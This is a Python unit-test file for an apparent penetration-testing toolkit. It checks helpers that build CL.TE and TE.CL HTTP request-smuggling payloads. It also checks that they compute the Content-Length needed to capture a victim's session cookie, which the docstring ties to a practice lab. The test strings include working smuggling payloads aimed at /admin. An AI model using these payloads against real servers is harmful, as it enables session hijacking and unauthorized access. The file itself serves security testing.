"""CL.TE capture-smuggle builders size the Content-Length from data.

Motivation: the "capture other users' requests" lab was a multi-hour blind
Content-Length search. The victim's session cookie was the LAST of three
cookies, ~820 bytes into an ~824-byte request, so the smuggled Content-Length
had to nearly equal the victim's total length — computable from a captured
sample, not guessable. These tests pin the byte math so a future run gets the
number in one shot.
"""

from __future__ import annotations

import unittest

from praetor.tools.testing_extended._smuggle_capture import (
    capture_cl_through,
    wrap_clte,
)


class WrapClteTest(unittest.TestCase):

    def test_outer_content_length_counts_terminator_plus_smuggled(self):
        smuggled = "POST /x HTTP/1.1\r\nContent-Length: 5\r\n\r\nhello"
        raw = wrap_clte("t.example", smuggled)
        # Outer body is "0\r\n\r\n" + smuggled; the declared Content-Length must equal it.
        body = raw.split("\r\n\r\n", 1)[1]
        declared = int([ln.split(": ", 1)[1] for ln in raw.split("\r\n")
                        if ln.lower().startswith("content-length:")][0])
        self.assertEqual(declared, len(body.encode()))
        self.assertEqual(body, "0\r\n\r\n" + smuggled)

    def test_has_both_cl_and_te_headers(self):
        raw = wrap_clte("t.example", "GET /404 HTTP/1.1\r\n\r\n")
        self.assertIn("Transfer-Encoding: chunked", raw)
        self.assertIn("Content-Length:", raw)
        self.assertTrue(raw.startswith("POST / HTTP/1.1\r\nHost: t.example\r\n"))

    def test_custom_path(self):
        raw = wrap_clte("t.example", "GET /a HTTP/1.1\r\n\r\n", path="/search")
        self.assertTrue(raw.startswith("POST /search HTTP/1.1"))


class CaptureClThroughTest(unittest.TestCase):

    # A victim request whose Cookie is the last header (the hard case).
    VICTIM = (
        "GET / HTTP/1.1\r\n"
        "Host: t.example\r\n"
        "user-agent: Mozilla/5.0 (Victim)\r\n"
        "cookie: fp=aaa; secret=bbb; session=ccc\r\n"
        "\r\n"
    )

    def test_sizes_to_end_of_cookie_line(self):
        r = capture_cl_through(self.VICTIM, prefix_len=100, capture_through="cookie")
        self.assertTrue(r["found"])
        # capture_depth reaches the end of the cookie line (through its CRLF),
        # so the full session value is inside the captured bytes.
        end = self.VICTIM.index("session=ccc") + len("session=ccc\r\n")
        self.assertEqual(r["capture_depth"], len(self.VICTIM[:end].encode()))
        self.assertEqual(r["content_length"], 100 + r["capture_depth"])

    def test_content_length_includes_prefix(self):
        r = capture_cl_through(self.VICTIM, prefix_len=115, capture_through="cookie")
        self.assertEqual(r["content_length"], 115 + r["capture_depth"])

    def test_missing_target_returns_floor_not_found(self):
        truncated = "GET / HTTP/1.1\r\nHost: t.example\r\nuser-agent: Mozilla/5.0 (Vic"
        r = capture_cl_through(truncated, prefix_len=100, capture_through="cookie")
        self.assertFalse(r["found"])
        # Floor = prefix + whole (truncated) sample length; deeper sample needed.
        self.assertEqual(r["capture_depth"], len(truncated.encode()))

    def test_case_insensitive_header_match(self):
        v = self.VICTIM.replace("cookie:", "Cookie:")
        r = capture_cl_through(v, prefix_len=0, capture_through="COOKIE")
        self.assertTrue(r["found"])


if __name__ == "__main__":
    unittest.main()


class WrapTeclTest(unittest.TestCase):

    def test_outer_cl_equals_chunk_size_line_length(self):
        from praetor.tools.testing_extended._smuggle_capture import wrap_tecl
        smuggled = "GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\nx="
        raw = wrap_tecl("t.example", smuggled)
        chunk_hex = format(len(smuggled.encode()), "x")
        declared = int([ln.split(": ", 1)[1] for ln in raw.split("\r\n")
                        if ln.lower().startswith("content-length:")][0])
        # Back-end (CL) must consume exactly the chunk-size line "<hex>\r\n".
        self.assertEqual(declared, len((chunk_hex + "\r\n").encode()))

    def test_three_digit_hex_needs_cl_5(self):
        from praetor.tools.testing_extended._smuggle_capture import wrap_tecl
        # A >255-byte smuggle -> 3 hex digits -> "1xx\r\n" = 5 bytes, not 4.
        big = "GET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\n" + "A" * 300
        raw = wrap_tecl("t.example", big)
        declared = int([ln.split(": ", 1)[1] for ln in raw.split("\r\n")
                        if ln.lower().startswith("content-length:")][0])
        self.assertEqual(declared, 5)
        self.assertIn(format(len(big.encode()), "x") + "\r\n", raw)

    def test_body_terminated_by_zero_chunk(self):
        from praetor.tools.testing_extended._smuggle_capture import wrap_tecl
        raw = wrap_tecl("t.example", "GET /x HTTP/1.1\r\nContent-Length: 5\r\n\r\ny=")
        self.assertTrue(raw.endswith("\r\n0\r\n\r\n"))
        self.assertIn("Transfer-Encoding: chunked", raw)
